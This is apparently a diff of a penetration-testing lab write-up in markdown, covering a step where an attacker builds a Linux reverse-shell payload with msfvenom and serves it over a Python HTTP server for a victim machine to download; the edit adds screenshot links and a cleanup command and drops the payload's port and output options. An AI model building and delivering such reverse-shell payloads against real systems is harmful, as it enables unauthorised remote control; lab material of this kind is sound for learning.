@@ -292,14 +292,10 @@ cat readme
 ## Section 4: Exploiting harper utilizing msfvenom as a reverse shell
 
 [3:25:45]
-
+![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/1a7d5b6e-dc59-4b1d-bac5-b5b1e7ac049c)
 ### (ATTACKER) 
 ```
 msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.122.209
-```
-
-```
-LPORT=61775 -f elf -o mal
 ```
 
 ```
@@ -307,12 +303,19 @@ ls
 ```
 
 ```
+sudo rm -r __MAC0SX
+```
+
+```
 file mal
 ```
+![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/88dadbc3-7f9b-4f49-be04-8eeef1d50722)
 
 ```
 python3 -m http.server 8000
 ```
+![image](https://github.com/sannicJP/Pen-Test-LAB/assets/161343927/f69be757-f20c-4bfc-89d2-e38541188b0d)
+
 
 ### (VICTIM) 
 
